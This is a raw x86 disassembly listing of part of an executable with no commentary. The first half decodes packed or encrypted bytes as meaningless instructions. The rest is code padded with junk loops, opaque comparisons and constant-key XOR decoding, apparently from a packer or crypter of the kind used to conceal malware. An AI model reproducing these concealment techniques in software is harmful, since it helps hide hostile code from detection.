  408ced:	and    al,0x96
  408cef:	cmp    DWORD PTR [esi+esi*8],edi
  408cf2:	fcomp  QWORD PTR [eax-0x7a]
  408cf5:	xchg   esi,eax
  408cf6:	fs adc esi,ebx
  408cf9:	gs xchg edi,eax
  408cfc:	pop    es
  408cfd:	xor    cl,BYTE PTR ds:0xeb81d865
  408d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d04:	leave  
  408d05:	cli    
  408d06:	in     al,dx
  408d07:	fldenv [edx]
  408d09:	mov    eax,ds:0x75212513
  408d0e:	jne    0x408d10
  408d10:	popa   
  408d11:	mov    dl,0x83
  408d13:	aas    
  408d14:	add    dh,BYTE PTR [edx]
  408d16:	in     eax,dx
  408d17:	mov    dh,0xe2
  408d19:	jbe    0x408cd9
  408d1b:	sbb    eax,0x10a84ca
  408d20:	aaa    
  408d21:	leave  
  408d22:	dec    ebp
  408d23:	cmp    BYTE PTR [esp+ebp*4-0x6d],ch
  408d27:	jno    0x408d4b
  408d29:	pop    ebx
  408d2a:	pop    ebp
  408d2b:	ins    DWORD PTR es:[edi],dx
  408d2c:	dec    eax
  408d2d:	aam    0x2d
  408d2f:	repnz mov ah,0x88
  408d32:	mov    ds:0x97f0fc77,eax
  408d37:	cmc    
  408d38:	jge    0x408d82
  408d3a:	jecxz  0x408d39
  408d3c:	inc    ebp
  408d3d:	pop    edx
  408d3e:	mov    ecx,0xab735c0a
  408d43:	xchg   ecx,eax
  408d44:	(bad)  
  408d45:	aad    0x7b
  408d47:	add    eax,0x7314b4b0
  408d4c:	xor    DWORD PTR [ebp+0x505c19c4],edx
  408d52:	iret   
  408d53:	xlat   BYTE PTR ds:[ebx]
  408d54:	enter  0xa689,0x5b
  408d58:	shr    BYTE PTR [edx],1
  408d5a:	mov    esp,?
  408d5c:	loope  0x408d03
  408d5e:	retf   
  408d5f:	adc    al,0xdc
  408d61:	pop    ds
  408d62:	mov    al,0xc1
  408d64:	fist   DWORD PTR [edx+0x29b79cac]
  408d6a:	mov    bh,0x70
  408d6c:	sub    BYTE PTR [ebx],ch
  408d6e:	inc    ebp
  408d6f:	or     eax,0x65497de7
  408d74:	es stos BYTE PTR es:[edi],al
  408d76:	adc    DWORD PTR [ecx],esi
  408d78:	add    edx,edi
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	ret    
  408dab:	cmp    ecx,DWORD PTR [edi-0x17]
  408dae:	mov    cl,0xd1
  408db0:	jle    0x408e30
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408df4
  408db7:	xchg   esi,eax
  408db8:	out    0xa8,al
  408dba:	lods   eax,DWORD PTR ds:[esi]
  408dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dbc:	sub    eax,DWORD PTR [esi*1-0x4a999a37]
  408dc3:	jae    0x408d46
  408dc5:	arpl   bp,dx
  408dc7:	mov    dl,0xa6
  408dc9:	xcrypt-ctr (bad)
  408dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dcb:	pop    esi
  408dcc:	mov    esp,0xc6a18359
  408dd1:	xchg   edi,eax
  408dd2:	mov    dh,0xf7
  408dd4:	fbld   TBYTE PTR [eax+0x34]
  408dd7:	xchg   dh,bl
  408dd9:	push   ds
  408dda:	xchg   ebp,eax
  408ddb:	xchg   ebx,eax
  408ddc:	dec    edi
  408ddd:	push   edi
  408dde:	into   
  408ddf:	adc    al,0x63
  408de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408de2:	jecxz  0x408dca
  408de4:	fsubr  st,st(1)
  408de6:	mul    DWORD PTR es:[esi-0x7c]
  408dea:	push   0x74515ed5
  408def:	add    eax,0x180c812b
  408df4:	adc    esi,esp
  408df6:	inc    esi
  408df7:	or     al,0x23
  408df9:	cwde   
  408dfa:	xchg   ebp,eax
  408dfb:	(bad)  
  408dfc:	mov    al,ds:0x99646fd7
  408e01:	aaa    
  408e02:	xor    al,0x9e
  408e04:	sbb    DWORD PTR [ecx],0x65f88aff
  408e0a:	push   ebp
  408e0b:	mov    dh,0x77
  408e0d:	rcl    BYTE PTR [esi+eax*4+0x7b],1
  408e11:	hlt    
  408e12:	(bad)  
  408e13:	in     eax,0xeb
  408e15:	ret    
  408e16:	cs mov dl,0x6d
  408e19:	pop    es
  408e1a:	xchg   esi,eax
  408e1b:	ror    dh,cl
  408e1d:	xchg   ecx,eax
  408e1e:	icebp  
  408e1f:	jbe    0x408e41
  408e21:	ss icebp 
  408e23:	outs   dx,BYTE PTR ds:[esi]
  408e24:	dec    edi
  408e25:	leave  
  408e26:	mov    eax,0x65508f03
  408e2b:	jecxz  0x408dc6
  408e2d:	mov    ecx,0xf9a88e42
  408e32:	adc    dh,ch
  408e34:	and    DWORD PTR [esi+0x7fd55308],ebx
  408e3a:	ret    0x3cd4
  408e3d:	sub    BYTE PTR [esi+0x69],0x2a
  408e41:	nop
  408e42:	bound  edx,QWORD PTR [eax]
  408e44:	sbb    BYTE PTR [ebp+0x9814070],bh
  408e4a:	and    al,0xf9
  408e4c:	xchg   ebx,eax
  408e4d:	xchg   esp,eax
  408e4e:	call   0x7a84466
  408e53:	mov    bl,0xaf
  408e55:	(bad)  
  408e56:	ss ins BYTE PTR es:[edi],dx
  408e58:	push   ecx
  408e59:	or     eax,0x4b24a47f
  408e5e:	test   al,0x79
  408e60:	rcl    al,1
  408e62:	jecxz  0x408e39
  408e64:	dec    esi
  408e65:	fld    QWORD PTR [ecx]
  408e67:	xor    esi,edx
  408e69:	pop    ss
  408e6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e6b:	xchg   eax,ecx
  408e6d:	dec    ecx
  408e6e:	dec    ecx
  408e6f:	xchg   edi,eax
  408e70:	nop
  408e71:	and    esi,ebp
  408e73:	lock mov ah,0x5
  408e76:	sub    DWORD PTR [edi+edi*1-0x26],esp
  408e7a:	mov    WORD PTR [edi-0x6e],?
  408e7d:	xlat   BYTE PTR ds:[ebx]
  408e7e:	push   eax
  408e7f:	(bad)  
  408e80:	mov    eax,esi
  408e82:	fimul  DWORD PTR [eax+0x37f89f67]
  408e88:	js     0x408e4a
  408e8a:	fcomp  DWORD PTR [edx+0x6e689a5b]
  408e90:	lds    esp,FWORD PTR [ebp+0x63]
  408e93:	mov    esi,0x2de60f0f
  408e98:	xchg   ebp,eax
  408e99:	loopne 0x408e3f
  408e9b:	jb     0x408ee8
  408e9d:	and    al,0xc6
  408e9f:	add    esp,edi
  408ea1:	sti    
  408ea2:	push   ss
  408ea3:	std    
  408ea4:	stc    
  408ea5:	xor    al,0x3a
  408ea7:	imul   esp,esi,0x16
  408eaa:	aad    0x39
  408eac:	cmp    dh,BYTE PTR [edx+0x1e5cb989]
  408eb2:	jle    0x408f1e
  408eb4:	mov    ds:0x798a52e1,al
  408eb9:	add    ecx,ebp
  408ebb:	scas   eax,DWORD PTR es:[edi]
  408ebc:	test   DWORD PTR [eax+0x38],ecx
  408ebf:	adc    eax,0xe71d9ecb
  408ec4:	int3   
  408ec5:	xchg   esi,eax
  408ec6:	icebp  
  408ec7:	jno    0x408ec5
  408ec9:	xor    dh,ah
  408ecb:	fwait
  408ecc:	(bad)  
  408ecd:	mov    al,BYTE PTR [eax]
  408ecf:	xchg   ebp,eax
  408ed0:	inc    edi
  408ed1:	popa   
  408ed2:	add    DWORD PTR [esi-0x560b5603],ebx
  408ed8:	ja     0x408f41
  408eda:	mov    esi,0x3a0674a2
  408edf:	cli    
  408ee0:	pop    es
  408ee1:	cmp    al,0x18
  408ee3:	pusha  
  408ee4:	cmp    BYTE PTR [eax],dh
  408ee6:	stos   BYTE PTR es:[edi],al
  408ee7:	and    eax,0x8262ce4b
  408eec:	xor    cl,BYTE PTR [ebp-0x5fde46a7]
  408ef2:	iret   
  408ef3:	mov    al,0x32
  408ef5:	add    eax,DWORD PTR [esi-0x1a]
  408ef8:	or     esi,ebx
  408efa:	mov    al,ds:0xe4a44107
  408eff:	loope  0x408f5b
  408f01:	fild   WORD PTR [eax+0x15]
  408f04:	dec    ebp
  408f05:	into   
  408f06:	lds    edi,FWORD PTR [ecx-0x410994b0]
  408f0c:	or     al,0x5e
  408f0e:	jg     0x408ec3
  408f10:	or     ch,BYTE PTR [ebx+0x44]
  408f13:	and    BYTE PTR [edx],dh
  408f15:	add    edi,esi
  408f17:	inc    esi
  408f18:	inc    DWORD PTR [eax+0x1ddcbcad]
  408f1e:	inc    eax
  408f1f:	and    DWORD PTR [edx+edx*2],eax
  408f22:	xchg   esp,eax
  408f23:	sub    eax,0xedc1bbd4
  408f28:	xchg   ebp,eax
  408f29:	jmp    0x408fa3
  408f2b:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  408f2d:	outs   dx,BYTE PTR ds:[esi]
  408f2e:	test   al,0xc8
  408f30:	push   eax
  408f31:	add    dh,BYTE PTR [eax-0x24ca4267]
  408f37:	push   es
  408f38:	lds    edx,FWORD PTR [edx-0x20246351]
  408f3e:	push   ecx
  408f3f:	and    ah,bh
  408f41:	xchg   ebx,eax
  408f42:	das    
  408f43:	aaa    
  408f44:	xor    eax,0x28b0f710
  408f49:	sub    al,0x8b
  408f4b:	pop    ebp
  408f4c:	clc    
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	ja     0x408f70
  408f62:	mov    BYTE PTR [ebp+ecx*8-0x75818121],dh
  408f69:	jg     0x408fe9
  408f6b:	jle    0x408f37
  408f6d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f6f:	into   
  408f70:	rcl    esi,0x30
  408f73:	jp     0x408fcf
  408f75:	and    al,0x78
  408f77:	add    bl,BYTE PTR [ecx+0xa8951b5]
  408f7d:	rcr    dl,0xa7
  408f80:	sahf   
  408f81:	outs   dx,BYTE PTR ds:[esi]
  408f82:	fsubr  DWORD PTR ds:0x5ff05b0a
  408f88:	imul   esp,DWORD PTR [si-0x5321],0x9
  408f8e:	jb     0x408f59
  408f90:	adc    eax,0x4740b13c
  408f95:	retf   0x7898
  408f98:	mov    ds:0x8600efa7,eax
  408f9d:	xchg   esi,eax
  408f9e:	(bad)  
  408f9f:	(bad)  
  408fa0:	pop    ebp
  408fa1:	fwait
  408fa2:	xchg   BYTE PTR [edx],dl
  408fa4:	xchg   edi,eax
  408fa5:	xor    DWORD PTR [edx],edi
  408fa7:	jl     0x408f81
  408fa9:	cmp    ebp,DWORD PTR [esi-0x5c]
  408fac:	add    eax,0x569c244c
  408fb1:	aam    0xb5
  408fb3:	scas   eax,DWORD PTR es:[edi]
  408fb4:	adc    ebp,0xbc056583
  408fba:	push   ebp
  408fbb:	jg     0x408f5e
  408fbd:	push   ds
  408fbe:	popa   
  408fbf:	inc    esp
  408fc0:	inc    edi
  408fc1:	stos   BYTE PTR es:[edi],al
  408fc2:	ds scas eax,DWORD PTR es:[edi]
  408fc4:	pop    edx
  408fc5:	and    BYTE PTR [edx+0x2d],al
  408fc8:	leave  
  408fc9:	int3   
  408fca:	out    0x7d,al
  408fcc:	sub    al,0x82
  408fce:	cmp    DWORD PTR [ebx-0x4a027bb],0xffffffa6
  408fd5:	daa    
  408fd6:	mov    esp,0xff93daea
  408fdb:	cmp    dl,BYTE PTR [esi+0x5f]
  408fde:	inc    edi
  408fdf:	mov    eax,edi
  408fe1:	std    
  408fe2:	jecxz  0x409024
  408fe4:	mov    edx,0x7064a6bc
  408fe9:	test   al,0x26
  408feb:	jmp    0x408f87
  408fed:	loop   0x408ff5
  408fef:	jmp    0x68fcf8a0
  408ff4:	ss jmp 0xf1c3e75a
  408ffa:	imul   edi,DWORD PTR ss:[eax+0x64],0xffffff82
  408fff:	adc    al,0x82
  409001:	or     DWORD PTR [edx+ebx*8-0x58],0x2b
  409006:	cdq    
  409007:	xchg   DWORD PTR [esi+0x18],ebp
  40900a:	or     edx,ecx
  40900c:	js     0x409024
  40900e:	sbb    esp,0x179f1559
  409014:	add    eax,0x8431816b
  409019:	and    BYTE PTR [ebx],dl
  40901b:	pop    esi
  40901c:	daa    
  40901d:	jecxz  0x408fe8
  40901f:	mul    BYTE PTR [esi]
  409021:	mov    ?,esp
  409023:	jnp    0x409093
  409025:	lock lods al,BYTE PTR ds:[esi]
  409027:	mov    ebx,0xae2eda4
  40902c:	repnz out 0x63,al
  40902f:	callw  0xf582
  409033:	adc    DWORD PTR [ebp+0x2fe65abc],ecx
  409039:	xor    esp,DWORD PTR [ebx+0x7f353bdf]
  40903f:	enter  0xeb8f,0x90
  409043:	inc    ebp
  409044:	adc    eax,eax
  409046:	and    DWORD PTR [ecx-0xe],eax
  409049:	adc    al,0x4c
  40904b:	cmc    
  40904c:	jb     0x4090c0
  40904e:	test   eax,0x51ede91f
  409053:	(bad)  
  409054:	out    dx,eax
  409055:	jbe    0x409019
  409057:	pop    ds
  409058:	sub    eax,0x91693f81
  40905d:	add    bl,dh
  40905f:	popf   
  409060:	inc    ebx
  409061:	mov    bl,0x43
  409063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409064:	shr    cl,1
  409066:	push   ebx
  409067:	js     0x4090c6
  409069:	adc    dl,BYTE PTR [esi-0x3]
  40906c:	inc    edi
  40906d:	mov    ds:0x6619b848,eax
  409072:	inc    esi
  409073:	scas   al,BYTE PTR es:[edi]
  409074:	push   esi
  409075:	xchg   ecx,eax
  409076:	xchg   ecx,eax
  409077:	repnz mov WORD PTR [eax],es
  40907a:	or     esp,DWORD PTR [ebp+0x61c7871c]
  409080:	and    eax,0xdf8acec7
  409085:	popf   
  409086:	repz pop eax
  409088:	cmp    edi,DWORD PTR [ebx+0x49]
  40908b:	mov    bl,BYTE PTR [ebp-0x1]
  40908e:	in     eax,0xaa
  409090:	xchg   esp,eax
  409091:	mov    esp,0x83b6e0f1
  409096:	call   0x2e31779e
  40909b:	xlat   BYTE PTR ds:[ebx]
  40909c:	sub    esi,ebx
  40909e:	fcomp  DWORD PTR [ecx+0x54]
  4090a1:	inc    ecx
  4090a2:	push   edi
  4090a3:	or     al,al
  4090a5:	das    
  4090a6:	cli    
  4090a7:	sti    
  4090a8:	mov    WORD PTR [eax],ds
  4090aa:	adc    BYTE PTR [edx],0x75
  4090ad:	push   edi
  4090ae:	fnsave [ebx+edi*1]
  4090b1:	dec    eax
  4090b2:	fcomp  QWORD PTR [ecx-0x575f74f2]
  4090b8:	mov    edx,0x6b0e4f15
  4090bd:	mov    edx,0xafbeff65
  4090c2:	nop
  4090c3:	iret   
  4090c4:	(bad)  
  4090c6:	fadd   DWORD PTR [eax+ebp*4-0x6a]
  4090ca:	retf   0xb706
  4090cd:	push   esp
  4090ce:	mov    eax,0x6dceb8a3
  4090d3:	and    ebp,esp
  4090d5:	or     esi,DWORD PTR [ebp+0x79b7cc67]
  4090db:	mov    esp,0x51974a1b
  4090e0:	cmp    al,0x94
  4090e2:	cld    
  4090e3:	iret   
  4090e4:	add    DWORD PTR [esi-0x3d],ecx
  4090e7:	adc    esp,DWORD PTR [eax]
  4090e9:	cmp    BYTE PTR [edi-0x5c],dh
  4090ec:	loop   0x40909a
  4090ee:	pop    edx
  4090ef:	in     eax,dx
  4090f0:	(bad)  
  4090f1:	pop    edi
  4090f2:	pop    eax
  4090f3:	xchg   DWORD PTR [ebp+0x3d615a79],ebx
  4090f9:	mov    dl,0xd5
  4090fb:	jmp    0xf22bdd6d
  409100:	add    edx,ecx
  409102:	imul   edx,ebx
  409105:	cmp    edx,edi
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42ea37
  40911f:	and    DWORD PTR ds:0x4304db,0x43043d
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42eddb,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x4304e3,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e7d8,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42ea77
  40916b:	sbb    DWORD PTR ds:0x430441,0x430471
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42edcb,0x624a
  409184:	call   DWORD PTR ds:0x42ea3f
  40918a:	adc    DWORD PTR ds:0x42e7c0,0x43045d
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x430451,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x430435,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x43046d,0x42e7d4
  4091c4:	call   DWORD PTR ds:0x42eae3
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e7c8
  4091d6:	and    DWORD PTR ds:0x430459,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x430439,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42eddb,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42eddb,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42eddb,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e9e3
  409219:	mov    ecx,DWORD PTR ds:0x42eddb
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42eddb,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ede3,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42eddf
  409243:	sbb    eax,DWORD PTR ds:0x42eddb
  409249:	mov    ds:0x42eddf,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42eddb
  409261:	and    DWORD PTR ds:0x42e7bc,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x430455,0x4304d7
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e7cc,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x430455,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42edcb,0x4304e7
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42edcb,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x430449,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x430459,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ede3,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e7c8,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x430435,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e9ff
  40930f:	adc    DWORD PTR ds:0x42eddf,0x42e7cc
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x430455,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x430451,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x430451
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x430451,ecx
  409352:	cmp    DWORD PTR ds:0x430451,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x430451,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e9e7
  409375:	cmp    DWORD PTR ds:0x430451,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x430451
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x430451,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42edcb
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e967
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x4304d3,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x4304eb,0x17
  4093b9:	cmp    DWORD PTR ds:0x4304eb,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x4304eb,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e9eb
  4093df:	cmp    DWORD PTR ds:0x4304eb,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x4304eb
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x4304eb,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x4304eb
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x4304eb,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x4304df,0x10
  409415:	cmp    DWORD PTR ds:0x4304df,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x4304df,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e9ef
  409438:	mov    ecx,DWORD PTR ds:0x4304df
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x4304df,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x430461
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x430469,0x16
  409461:	cmp    DWORD PTR ds:0x430469,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x430469,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e9f3
  409481:	mov    ecx,DWORD PTR ds:0x430469
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x430469,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42edcf,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42edcf
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42edcf,ecx
  4094b7:	cmp    DWORD PTR ds:0x42edcf,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42edcf,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e8fb
  4094d6:	push   0x42e8a5
  4094db:	call   DWORD PTR ds:0x42ec2b
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x430451,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x4304eb,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ede3,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x430469,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x4304e3,0x430471
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x430439,0x1e
  40953f:	cmp    DWORD PTR ds:0x430439,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x430439,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e7dc
  409566:	call   DWORD PTR ds:0x42e9f7
  40956c:	mov    eax,ds:0x430439
  409571:	dec    eax
  409572:	mov    ds:0x430439,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430489
  409582:	mov    eax,ds:0x430513
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x4304cf,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e7d8,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x430441,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x430441
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x430441,edx
  4095e8:	cmp    DWORD PTR ds:0x430441,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e8cd
  409617:	call   DWORD PTR ds:0x42e9fb
  40961d:	cmp    DWORD PTR ds:0x430441,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e7c8,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e7c8
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e7c8,ecx
  40964a:	cmp    DWORD PTR ds:0x42e7c8,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42ec2f
  409672:	cmp    DWORD PTR ds:0x42e7c8,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
  409690:	xor    edx,esi
  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
